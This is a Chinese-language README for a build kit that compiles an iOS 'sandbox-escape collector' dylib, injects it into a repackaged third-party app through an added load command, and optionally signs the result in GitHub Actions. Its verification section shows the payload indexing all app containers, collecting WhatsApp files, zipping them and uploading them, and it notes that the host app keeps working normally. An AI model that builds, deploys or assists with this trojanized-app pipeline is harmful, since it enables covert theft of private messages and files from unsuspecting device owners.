# wq-build

把 `WQCollector.dylib`（worse_query 沙盒逃逸采集器）编译出来，注入 `app.ipa`，可选签名。

## 一键出包

1. 建一个 **private** 仓库，把本目录推上去：

```powershell
git init
git add -A
git commit -m "wq build"
git remote add origin https://github.com/<你的账号>/<仓库名>.git
git push -u origin main
```

2. （可选）仓库 → Settings → Secrets and variables → Actions 添加：

| Secret | 内容 |
|---|---|
| `SIGN_P12_BASE64` | `[Convert]::ToBase64String([IO.File]::ReadAllBytes("cert.p12"))` |
| `SIGN_P12_PASS` | p12 密码 |
| `SIGN_PROFILE_BASE64` | 同上，对 `.mobileprovision` 做 base64 |

> 不配也能跑：只产出未签名的 `injected.ipa`。

3. 仓库 → **Actions** → `build-wq-ipa` → **Run workflow**（参数用默认）

4. 跑完在 Artifacts 下载：

```
WQCollector.dylib   编译产物
injected.ipa        已注入、bundle id 已改、未签名
signed.ipa          配了 secrets 才有
```

## 目录

```
.github/workflows/build.yml   CI：编译 → 注入 → 改 bundle id → 可选签名
WQ/
├── WQCollector.m             采集 dylib（容器索引 + 采集 + ZIP + 上传）
├── worse_query.m / .h        上游沙盒逃逸实现（GPL-3.0-or-later）
├── wq_segment.m              可选：并进自己 loader 用的增量补丁
└── build.sh                  本地编译（Mac）
inject.py                     注入器：追加 LC_LOAD_DYLIB
app.ipa                       名人国际_wq_ready（bundle id 已解耦）
PUSH.md / deploy.ps1          推送说明与脚本
```

## 前提

- **App Group**：worse_query 靠 App Group 容器换 sandbox token。签名用的 profile 必须含 `com.apple.security.application-groups`（付费开发者账号可建）。没有时 dylib 打印 `NO APP GROUP` 后退出，**不影响原包功能**。
- **架构一致**：如果你在别处编（例如自己的 arm64e 管线），必须和主程序架构一致，否则 dyld 会报 `have 'arm64', need 'arm64e'`。

## 验证

```bash
ideviceinstaller -i signed.ipa
idevicesyslog | grep "\[WQ\]"
```

期望：

```
[WQ] start: group=group.xxx os=27.2 alt_flags=0
[WQ] indexed N containers under /private/var/mobile/Containers/Data/Application
[WQ] net.whatsapp.WhatsApp collected M files
[WQ] upload wq_...zip -> 200
```

## 许可

`worse_query.m` 来自 https://github.com/forcequitOS/worse_query ，GPL-3.0-or-later。
